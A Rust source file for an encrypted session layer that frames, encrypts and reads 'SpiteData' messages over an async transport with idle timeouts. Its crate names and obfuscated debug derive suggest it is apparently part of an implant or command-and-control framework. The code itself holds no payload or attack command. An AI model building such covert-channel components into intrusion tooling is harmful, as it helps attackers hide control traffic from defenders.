use std::pin::Pin;
use std::time::Duration;

use futures::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
use futures::pin_mut;
use futures::FutureExt;
use futures_timer::Delay;

use malefic_crypto::crypto::Cryptor;
use malefic_proto::{parser_header, SpiteData, HEADER_LEN};

use crate::{TransportError, TransportImpl};
use malefic_gateway::ObfDebug;

/// Session-layer configuration.
///
/// `deadline` is used as the idle timeout for frame assembly when the
/// caller opts into deadline-aware reads. Progress resets the timer.
#[derive(Clone, ObfDebug)]
pub struct SessionConfig {
    /// Max bytes per read call when reading large frame bodies.
    pub read_chunk_size: usize,
    /// Idle deadline used by deadline-aware reads.
    pub deadline: Duration,
}

impl Default for SessionConfig {
    fn default() -> Self {
        Self {
            read_chunk_size: 8192,
            deadline: Duration::from_secs(10),
        }
    }
}

pub struct Session<T> {
    transport: T,
    cryptor: Cryptor,
    config: SessionConfig,
}

impl<T: TransportImpl + 'static> Session<T> {
    pub fn new(transport: T, cryptor: Cryptor, config: SessionConfig) -> Self {
        Self {
            transport,
            cryptor,
            config,
        }
    }

    pub async fn read(&mut self) -> Result<Option<SpiteData>, TransportError> {
        read(&mut self.transport, &mut self.cryptor, &self.config).await
    }

    pub async fn write(&mut self, data: &SpiteData) -> Result<(), TransportError> {
        let encrypted_header = self.cryptor.encrypt(data.header())?;
        let encrypted_body = self.cryptor.encrypt(data.body())?;
        self.transport.write_all(&encrypted_header).await?;
        self.transport.write_all(&encrypted_body).await?;
        self.transport.flush().await?;
        Ok(())
    }

    pub fn split(self) -> (SessionReader, SessionWriter) {
        let (reader, writer) = self.transport.split();
        let reader_cryptor = self.cryptor.clone();
        let writer_cryptor = self.cryptor;

        (
            SessionReader {
                reader: Box::pin(reader),
                cryptor: reader_cryptor,
                config: self.config.clone(),
            },
            SessionWriter {
                writer: Box::pin(writer),
                cryptor: writer_cryptor,
            },
        )
    }

    pub fn reset_cryptor(&mut self) {
        self.cryptor.reset();
    }

    #[allow(dead_code)]
    pub fn get_mut(&mut self) -> &mut T {
        &mut self.transport
    }
}

pub struct SessionReader {
    reader: Pin<Box<dyn AsyncRead + Send>>,
    cryptor: Cryptor,
    config: SessionConfig,
}

impl SessionReader {
    pub async fn read(&mut self) -> Result<Option<SpiteData>, TransportError> {
        read(&mut self.reader, &mut self.cryptor, &self.config).await
    }
}

pub struct SessionWriter {
    writer: Pin<Box<dyn AsyncWrite + Send>>,
    cryptor: Cryptor,
}

impl SessionWriter {
    pub async fn write(&mut self, data: &SpiteData) -> Result<(), TransportError> {
        let encrypted_header = self.cryptor.encrypt(data.header())?;
        let encrypted_body = self.cryptor.encrypt(data.body())?;
        self.writer.write_all(&encrypted_header).await?;
        self.writer.write_all(&encrypted_body).await?;
        self.writer.flush().await?;
        Ok(())
    }

    pub async fn close(&mut self) -> Result<(), TransportError> {
        self.writer.close().await?;
        Ok(())
    }
}

async fn read<R: AsyncRead + Unpin>(
    reader: &mut R,
    cryptor: &mut Cryptor,
    config: &SessionConfig,
) -> Result<Option<SpiteData>, TransportError> {
    let Some(encrypted_header) = read_bytes(
        reader,
        HEADER_LEN,
        config.read_chunk_size,
        config.deadline,
        true,
    )
    .await?
    else {
        return Ok(None);
    };

    let header = cryptor.decrypt(encrypted_header)?;
    let mut spite_data = parser_header(&header)?;

    let body_len = spite_data.length as usize + 1;
    let encrypted_body = read_bytes(
        reader,
        body_len,
        config.read_chunk_size,
        config.deadline,
        false,
    )
    .await?
    .ok_or(TransportError::Deadline)?;
    let decrypted_body = cryptor.decrypt(encrypted_body)?;
    spite_data.set_data(decrypted_body)?;
    Ok(Some(spite_data))
}

async fn read_bytes<R: AsyncRead + Unpin>(
    reader: &mut R,
    target_len: usize,
    read_chunk_size: usize,
    deadline: Duration,
    idle_if_empty: bool,
) -> Result<Option<Vec<u8>>, TransportError> {
    let mut dst = Vec::with_capacity(target_len);

    while dst.len() < target_len {
        let remaining = target_len - dst.len();
        let chunk_len = remaining.min(read_chunk_size.max(1));
        let mut chunk = vec![0u8; chunk_len];

        let read = reader.read(&mut chunk).fuse();
        let timeout = Delay::new(deadline).fuse();
        pin_mut!(read, timeout);

        let n = futures::select! {
            result = read => result?,
            _ = timeout => {
                if idle_if_empty && dst.is_empty() {
                    return Ok(None);
                }
                return Err(TransportError::Deadline);
            }
        };

        if n == 0 {
            return Err(TransportError::UnexpectedEof);
        }

        dst.extend_from_slice(&chunk[..n]);
    }

    Ok(Some(dst))
}
